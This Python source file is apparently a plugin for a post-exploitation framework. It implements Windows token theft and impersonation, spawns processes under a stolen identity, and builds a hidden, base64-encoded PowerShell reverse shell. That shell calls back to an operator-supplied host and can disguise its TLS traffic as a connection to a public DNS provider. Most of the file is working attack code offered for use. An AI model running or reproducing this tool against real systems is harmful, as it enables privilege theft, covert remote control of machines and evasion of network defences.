import base64
import gzip
import hashlib
import os
from typing import List

from ...constants import PLUGIN_MARK_END, PLUGIN_MARK_START
from ..api import plugin, SessionContext
from ..shared.common import format_generic_report
from ..shared.runner import run_collector_plugin


_USAGE = """steal_token — Windows token theft and impersonation.

Usage:
  run steal_token --list                          List processes and owners
  run steal_token --whoami                        Show current identity
  run steal_token --pid <pid>                     Impersonate token from <pid>
  run steal_token --user <username>               Impersonate first viable process owned by user
  run steal_token --spawn <pid> [-C <command>]    Spawn a process as the token owner
  run steal_token --spawn-cmd <pid>               Spawn an interactive cmd.exe as token owner
  run steal_token --shell <pid> -rh <ip> -rp <port> [--no-tls]
  run steal_token --spawn-shell <pid> -rh <ip> -rp <port> [--no-tls]
                                                  Spawn a reverse shell as the token owner
  run steal_token --rev2self                      Revert impersonation

Notes:
  - --pid and --user impersonate the current thread. This persists only for
    interactive PowerShell sessions; cmd.exe shells lose it when the plugin
    returns. The plugin warns when this applies.
  - --spawn, --spawn-cmd, --shell, and --spawn-shell are process-independent
    and reliable on any shell. Use --spawn-shell for the most stable path.
""".strip()

_CS_FILE = os.path.join(os.path.dirname(__file__), '_token_ops.cs')


def _load_cs_compressed_b64() -> str:
    try:
        with open(_CS_FILE, 'r', encoding='utf-8') as fh:
            src = fh.read()
    except OSError:
        return ''
    try:
        compressed = gzip.compress(src.encode('utf-8'), compresslevel=9)
    except Exception:
        return ''
    return base64.b64encode(compressed).decode('ascii')


_TOKEN_CS_GZ_B64 = _load_cs_compressed_b64()


def _token_cs_version() -> str:
    if not _TOKEN_CS_GZ_B64:
        return 'unknown'
    try:
        raw = gzip.decompress(base64.b64decode(_TOKEN_CS_GZ_B64))
    except Exception:
        return 'unknown'
    return hashlib.sha256(raw).hexdigest()[:8]


_TOKEN_CS_VERSION = _token_cs_version()
_TOKEN_TYPE_NAME = f"TornadoTokenOps_{_TOKEN_CS_VERSION}"


def _cs_bootstrap_ps() -> str:
    if not _TOKEN_CS_GZ_B64:
        return (
            "$TOKEN_OPS_OK = $false\n"
            "$TOKEN_OPS_ERR = 'TornadoTokenOps source missing (_token_ops.cs not found)'\n"
        )
    return (
        "$TOKEN_OPS_OK = $true\n"
        "$TOKEN_OPS_ERR = ''\n"
        f"if (-not ('{_TOKEN_TYPE_NAME}' -as [type])) {{\n"
        "  try {\n"
        f"    $b = '{_TOKEN_CS_GZ_B64}'\n"
        "    $raw = [Convert]::FromBase64String($b)\n"
        "    $ms = New-Object IO.MemoryStream(,$raw)\n"
        "    $gz = New-Object IO.Compression.GZipStream($ms, [IO.Compression.CompressionMode]::Decompress)\n"
        "    $sr = New-Object IO.StreamReader($gz)\n"
        "    $src = $sr.ReadToEnd()\n"
        "    $sr.Close(); $gz.Close(); $ms.Close()\n"
        f"    $src = $src.Replace('class TornadoTokenOps', 'class {_TOKEN_TYPE_NAME}')\n"
        "    Add-Type -TypeDefinition $src -Language CSharp -ErrorAction Stop 2>&1 | Out-Null\n"
        f"    if (-not ('{_TOKEN_TYPE_NAME}' -as [type])) {{\n"
        "      $TOKEN_OPS_OK = $false\n"
        "      $TOKEN_OPS_ERR = 'Add-Type ran but type is still not present'\n"
        "    }\n"
        "  } catch {\n"
        "    $TOKEN_OPS_OK = $false\n"
        "    $TOKEN_OPS_ERR = $_.Exception.Message\n"
        "  }\n"
        "}\n"
    )

def _ps_quote(s: str) -> str:
    return (s or "").replace("'", "''")


def _ps_b64(script: str) -> str:
    return base64.b64encode(script.encode('utf-16-le')).decode('ascii')

def _log_steal(session, mode, **kwargs):
    parts = [f"mode={mode}"]
    for k, v in kwargs.items():
        if v is not None:
            parts.append(f"{k}={v}")
    try:
        session.log_event("steal_token: " + " ".join(parts))
    except Exception:
        pass

# ---------------------------------------------------------------------------
# PowerShell builders
# ---------------------------------------------------------------------------

def _build_list_ps() -> str:
    return f"""
$ErrorActionPreference='SilentlyContinue'
$s='{PLUGIN_MARK_START}'; $e='{PLUGIN_MARK_END}'
$groups = @{{}}
foreach ($p in (Get-CimInstance Win32_Process -EA 0)) {{
    $owner = ''
    try {{
        $o = Invoke-CimMethod -InputObject $p -MethodName GetOwner -EA 0
        if ($o -and $o.User) {{
            if ($o.Domain) {{ $owner = $o.Domain + '\\' + $o.User }} else {{ $owner = $o.User }}
        }}
    }} catch {{}}
    if (-not $owner) {{ continue }}
    if (-not $groups.ContainsKey($owner)) {{
        $groups[$owner] = [ordered]@{{
            owner = $owner
            count = 0
            pids = @()
        }}
    }}
    $groups[$owner].count += 1
    $groups[$owner].pids += $p.ProcessId
}}

$result = [ordered]@{{
    summary = @{{
        distinct_owners = $groups.Count
        total_processes = (($groups.Values | ForEach-Object {{ $_.count }}) | Measure-Object -Sum).Sum
    }}
    owners = @($groups.Values | Sort-Object -Property count -Descending)
}}
Write-Output ($s + (ConvertTo-Json $result -Depth 4 -Compress) + $e)
"""


def _build_whoami_ps() -> str:
    return f"""
$s='{PLUGIN_MARK_START}'; $e='{PLUGIN_MARK_END}'
$thread_id = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$proc_owner = ''
try {{
    $p = Get-CimInstance Win32_Process -Filter "ProcessId = $PID" -EA 0
    if ($p) {{
        $o = Invoke-CimMethod -InputObject $p -MethodName GetOwner -EA 0
        if ($o -and $o.User) {{
            if ($o.Domain) {{ $proc_owner = $o.Domain + '\\' + $o.User }} else {{ $proc_owner = $o.User }}
        }}
    }}
}} catch {{}}

$integrity = 'unknown'
try {{
    $line = whoami /groups 2>&1 | Select-String 'Mandatory Label' | Select-Object -First 1
    if ($line) {{
        if     ($line -match 'System')   {{ $integrity = 'System' }}
        elseif ($line -match 'High')     {{ $integrity = 'High' }}
        elseif ($line -match 'Medium')   {{ $integrity = 'Medium' }}
        elseif ($line -match 'Low')      {{ $integrity = 'Low' }}
        elseif ($line -match 'Untrusted'){{ $integrity = 'Untrusted' }}
    }}
}} catch {{}}

$session_id = 'unknown'
try {{
    $session_id = (Get-Process -Id $PID -EA 0).SessionId
}} catch {{}}

$is_elevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

$result = [ordered]@{{
    summary = @{{
        thread_identity = $thread_id
        process_owner = $proc_owner
        integrity = $integrity
        session_id = $session_id
        elevated = $is_elevated
    }}
}}
Write-Output ($s + (ConvertTo-Json $result -Compress) + $e)
"""

def _build_steal_ps(pid: int) -> str:
    return _cs_bootstrap_ps() + f"""
$s='{PLUGIN_MARK_START}'; $e='{PLUGIN_MARK_END}'
if (-not $TOKEN_OPS_OK) {{
    $result = [ordered]@{{
        summary = @{{
            success = $false
            pid = {pid}
            error = "C# assembly load failed: $TOKEN_OPS_ERR"
        }}
    }}
    Write-Output ($s + (ConvertTo-Json $result -Compress) + $e)
    return
}}
$before = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$err = [{_TOKEN_TYPE_NAME}]::StealAndImpersonate({pid})
$after = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
if ($err -eq '' -and $after -ne $before) {{
    $result = [ordered]@{{
        summary = @{{
            success = $true
            pid = {pid}
            before = $before
            impersonated = $after
        }}
    }}
}} elseif ($err -eq '') {{
    $result = [ordered]@{{
        summary = @{{
            success = $false
            pid = {pid}
            error = "Impersonation returned success but identity is unchanged ($before). This shell does not preserve thread impersonation — use --spawn or --spawn-shell instead."
        }}
    }}
}} else {{
    $result = [ordered]@{{
        summary = @{{
            success = $false
            pid = {pid}
            error = $err
        }}
    }}
}}
Write-Output ($s + (ConvertTo-Json $result -Compress) + $e)
"""


def _build_steal_by_user_ps(username: str) -> str:
    user_esc = _ps_quote(username)
    return _cs_bootstrap_ps() + f"""
$s='{PLUGIN_MARK_START}'; $e='{PLUGIN_MARK_END}'
if (-not $TOKEN_OPS_OK) {{
    $result = [ordered]@{{
        summary = @{{
            success = $false
            error = "C# assembly load failed: $TOKEN_OPS_ERR"
        }}
    }}
    Write-Output ($s + (ConvertTo-Json $result -Compress) + $e)
    return
}}
$target = '{user_esc}'
$hasDomain = $target -like '*\\*'
$bare = $target
if ($hasDomain) {{ $bare = $target.Split('\\')[-1] }}
if ($bare -like '*@*') {{ $bare = $bare.Split('@')[0] }}

$candidates = @()
foreach ($p in (Get-CimInstance Win32_Process -EA 0)) {{
    try {{
        $o = Invoke-CimMethod -InputObject $p -MethodName GetOwner -EA 0
        if (-not $o -or -not $o.User) {{ continue }}
        $ownerBare = $o.User
        $ownerFull = if ($o.Domain) {{ $o.Domain + '\\' + $o.User }} else {{ $o.User }}
        if ($hasDomain) {{
            if ($ownerFull -ieq $target) {{ $candidates += $p }}
        }} else {{
            if ($ownerBare -ieq $bare) {{ $candidates += $p }}
        }}
    }} catch {{}}
}}

if ($candidates.Count -eq 0) {{
    $result = [ordered]@{{
        summary = @{{ success = $false; error = "No process found owned by $target" }}
    }}
}} else {{
    $before = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $err = ''
    $match = $null
    $tried = @()
    foreach ($p in $candidates) {{
        $err = [{_TOKEN_TYPE_NAME}]::StealAndImpersonate($p.ProcessId)
        $tried += "$($p.Name)($($p.ProcessId))"
        if ($err -eq '') {{
            $match = $p
            break
        }}
    }}
    $after = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    if ($match -ne $null -and $after -ne $before) {{
        $result = [ordered]@{{
            summary = @{{
                success = $true
                pid = $match.ProcessId
                name = $match.Name
                before = $before
                impersonated = $after
                tried = $tried
            }}
        }}
    }} elseif ($match -ne $null) {{
        $result = [ordered]@{{
            summary = @{{
                success = $false
                error = "Impersonation silently failed — use --spawn or --spawn-shell"
                tried = $tried
            }}
        }}
    }} else {{
        $result = [ordered]@{{
            summary = @{{
                success = $false
                error = "All $($candidates.Count) candidate processes failed: $err"
                tried = $tried
            }}
        }}
    }}
}}
Write-Output ($s + (ConvertTo-Json $result -Compress) + $e)
"""


def _build_spawn_ps(pid: int, command: str) -> str:
    cmd_esc = _ps_quote(command)
    return _cs_bootstrap_ps() + f"""
$s='{PLUGIN_MARK_START}'; $e='{PLUGIN_MARK_END}'
if (-not $TOKEN_OPS_OK) {{
    $result = [ordered]@{{
        summary = @{{
            success = $false
            parent_pid = {pid}
            error = "C# assembly load failed: $TOKEN_OPS_ERR"
        }}
    }}
    Write-Output ($s + (ConvertTo-Json $result -Compress) + $e)
    return
}}
$cmd = '{cmd_esc}'
$err = [{_TOKEN_TYPE_NAME}]::SpawnAsUser({pid}, $cmd)
if ($err -like 'PID:*') {{
    $childPid = [int]$err.Substring(4)
    $result = [ordered]@{{
        summary = @{{
            success = $true
            parent_pid = {pid}
            child_pid = $childPid
        }}
    }}
}} else {{
    $result = [ordered]@{{
        summary = @{{
            success = $false
            parent_pid = {pid}
            error = $err
        }}
    }}
}}
Write-Output ($s + (ConvertTo-Json $result -Compress) + $e)
"""


def _build_rev2self_ps() -> str:
    return _cs_bootstrap_ps() + f"""
$s='{PLUGIN_MARK_START}'; $e='{PLUGIN_MARK_END}'
if (-not $TOKEN_OPS_OK) {{
    $result = [ordered]@{{
        summary = @{{
            success = $false
            error = "C# assembly load failed: $TOKEN_OPS_ERR"
        }}
    }}
    Write-Output ($s + (ConvertTo-Json $result -Compress) + $e)
    return
}}
$ok = [{_TOKEN_TYPE_NAME}]::Revert()
$who = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$result = [ordered]@{{
    summary = @{{
        success = $ok
        identity = $who
    }}
}}
Write-Output ($s + (ConvertTo-Json $result -Compress) + $e)
"""


# ---------------------------------------------------------------------------
# Reverse shell payload for --shell / --spawn-shell
# ---------------------------------------------------------------------------

def _reverse_shell_ps(host: str, port: int, use_tls: bool = True) -> str:
    if use_tls:
        connect = (
            f"$a=New-Object Net.Sockets.TcpClient('{host}',{port});"
            f"$b=New-Object Net.Security.SslStream($a.GetStream(),$false,({{$true}}));"
            f"$b.AuthenticateAsClient('cloudflare-dns.com');"
        )
    else:
        connect = (
            f"$a=New-Object Net.Sockets.TcpClient('{host}',{port});"
            f"$b=$a.GetStream();"
        )
    return (
        "$ErrorActionPreference='SilentlyContinue';"
        + "$exit_code=1;"
        + "$a=$null;$b=$null;$r=$null;$w=$null;"
        + "try{"
        + connect
        + "$r=New-Object IO.StreamReader($b);"
        + "$w=New-Object IO.StreamWriter($b);"
        + "$w.AutoFlush=$true;"
        + "$w.WriteLine('SHELL READY');"
        + "while($true){"
        + "$l=$r.ReadLine();"
        + "if($null -eq $l){break};"
        + "if($l.Trim() -eq 'exit'){break};"
        + "$o='';"
        + "try{$o=(& ([ScriptBlock]::Create($l)) 2>&1|Out-String)}catch{$o=$_.Exception.Message};"
        + "$w.WriteLine($o)}"
        + "$exit_code=0"
        + "}catch{}"
        + "try{if($w){$w.Close()};if($r){$r.Close()};if($b){$b.Close()};if($a){$a.Close()}}catch{};"
        + "exit $exit_code"
    )


def _spawn_shell_command(host: str, port: int, use_tls: bool) -> str:
    inner = _reverse_shell_ps(host, port, use_tls)
    encoded = _ps_b64(inner)
    return f'powershell -NoP -NonI -W Hidden -EncodedCommand {encoded}'


# ---------------------------------------------------------------------------
# Shell persistence check
# ---------------------------------------------------------------------------

def _warn_if_not_persistent(session):
    try:
        info = session._handler._client_info(session._client_sock) or {}
        win_shell = info.get('win_shell', 'cmd')
        if win_shell != 'powershell':
            session.print(
                "Warning: this session is cmd.exe. Thread impersonation "
                "will be lost as soon as this plugin returns. "
                "Use --spawn-shell or --spawn-cmd for a persistent identity.",
                'yellow',
            )
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Argument parsing
# ---------------------------------------------------------------------------

def _parse_args(args: List[str]) -> dict:
    opts = {
        'help': False,
        'list': False,
        'whoami': False,
        'rev2self': False,
        'pid': None,
        'user': None,
        'spawn_pid': None,
        'spawn_cmd': None,
        'spawn_cmd_pid': None,
        'shell_pid': None,
        'spawn_shell_pid': None,
        'rh': None,
        'rp': None,
        'use_tls': True,
    }
    i = 0
    while i < len(args):
        a = args[i]
        if a in ('--help', '-h'):
            opts['help'] = True
            return opts
        if a == '--list':
            opts['list'] = True
        elif a == '--whoami':
            opts['whoami'] = True
        elif a == '--rev2self':
            opts['rev2self'] = True
        elif a == '--pid' and i + 1 < len(args):
            opts['pid'] = args[i + 1]; i += 1
        elif a == '--user' and i + 1 < len(args):
            opts['user'] = args[i + 1]; i += 1
        elif a == '--spawn' and i + 1 < len(args):
            opts['spawn_pid'] = args[i + 1]; i += 1
        elif a == '--spawn-cmd' and i + 1 < len(args):
            opts['spawn_cmd_pid'] = args[i + 1]; i += 1
        elif a == '--shell' and i + 1 < len(args):
            opts['shell_pid'] = args[i + 1]; i += 1
        elif a == '--spawn-shell' and i + 1 < len(args):
            opts['spawn_shell_pid'] = args[i + 1]; i += 1
        elif a in ('-C', '--command') and i + 1 < len(args):
            opts['spawn_cmd'] = args[i + 1]; i += 1
        elif a in ('-rh', '--callback-host') and i + 1 < len(args):
            opts['rh'] = args[i + 1]; i += 1
        elif a in ('-rp', '--callback-port') and i + 1 < len(args):
            opts['rp'] = args[i + 1]; i += 1
        elif a == '--no-tls':
            opts['use_tls'] = False
        i += 1
    return opts


# ---------------------------------------------------------------------------
# Plugin entry point
# ---------------------------------------------------------------------------

@plugin.command(
    name='steal_token',
    platforms=['windows'],
    description='Windows token theft — impersonate other processes\' tokens',
)
def run(session: SessionContext, args: List[str]):
    session.log_event('steal_token: started')

    if not args:
        session.print(_USAGE)
        return 0

    try:
        opts = _parse_args(args)
    except Exception as exc:
        session.print(f"Argument error: {exc}", 'red')
        return 1

    if opts.get('help'):
        session.print(_USAGE)
        return 0

    if opts['list']:
        def build(): return _build_list_ps()
        return run_collector_plugin(
            session, 'steal_token', None, build,
            format_generic_report, timeout=60.0,
        )

    if opts['whoami']:
        def build(): return _build_whoami_ps()
        return run_collector_plugin(
            session, 'steal_token', None, build,
            format_generic_report, timeout=15.0,
        )

    if opts['rev2self']:
        def build(): return _build_rev2self_ps()
        return run_collector_plugin(
            session, 'steal_token', None, build,
            format_generic_report, timeout=20.0,
        )

    if opts['pid']:
        _warn_if_not_persistent(session)
        try:
            pid = int(opts['pid'])
        except ValueError:
            session.print(f"Invalid PID: {opts['pid']}", 'red')
            return 1
        def build(): return _build_steal_ps(pid)
        rc = run_collector_plugin(
            session, 'steal_token', None, build,
            format_generic_report, timeout=20.0,
        )
        _log_steal(session, "pid", pid=pid, rc=rc)
        return rc

    if opts['user']:
        _warn_if_not_persistent(session)
        user = opts['user']
        def build(): return _build_steal_by_user_ps(user)
        rc = run_collector_plugin(
            session, 'steal_token', None, build,
            format_generic_report, timeout=45.0,
        )
        _log_steal(session, "user", user=user, rc=rc)
        return rc

    if opts['spawn_cmd_pid']:
        try:
            pid = int(opts['spawn_cmd_pid'])
        except ValueError:
            session.print(f"Invalid PID: {opts['spawn_cmd_pid']}", 'red')
            return 1
        def build(): return _build_spawn_ps(pid, 'cmd.exe /k')
        rc = run_collector_plugin(
            session, 'steal_token', None, build,
            format_generic_report, timeout=30.0,
        )
        _log_steal(session, "spawn-cmd", parent_pid=pid, rc=rc)
        return rc

    if opts['spawn_pid']:
        try:
            pid = int(opts['spawn_pid'])
        except ValueError:
            session.print(f"Invalid PID: {opts['spawn_pid']}", 'red')
            return 1
        cmd = opts['spawn_cmd'] or 'cmd.exe'
        def build(): return _build_spawn_ps(pid, cmd)
        rc = run_collector_plugin(
            session, 'steal_token', None, build,
            format_generic_report, timeout=30.0,
        )
        _log_steal(session, "spawn", parent_pid=pid, cmd=cmd, rc=rc)
        return rc

    if opts['shell_pid'] or opts['spawn_shell_pid']:
        pid_raw = opts['shell_pid'] or opts['spawn_shell_pid']
        if not opts['rh'] or not opts['rp']:
            session.print("--shell / --spawn-shell require -rh <host> and -rp <port>", 'red')
            return 1
        try:
            pid = int(pid_raw)
            rp = int(opts['rp'])
        except ValueError:
            session.print("Invalid PID or port", 'red')
            return 1

        cmd = _spawn_shell_command(opts['rh'], rp, opts['use_tls'])
        session.print(
            f"Spawning reverse shell as token owner of PID {pid} "
            f"(callback {opts['rh']}:{rp}, TLS={opts['use_tls']})",
            'yellow',
        )
        def build(): return _build_spawn_ps(pid, cmd)
        rc = run_collector_plugin(
            session, 'steal_token', None, build,
            format_generic_report, timeout=30.0,
        )
        _log_steal(
            session,
            "spawn-shell",
            parent_pid=pid,
            callback=f"{opts['rh']}:{rp}",
            tls=opts['use_tls'],
            rc=rc,
        )
        if rc == 0:
            session.print(
                f"Shell spawned as token owner of PID {pid}. "
                f"Check `status` in the main menu — the new session should "
                f"appear within a few seconds. If it doesn't, the target "
                f"may have blocked outbound to {opts['rh']}:{opts['rp']}.",
                'yellow',
            )
        return rc

    session.print(_USAGE)
    return 0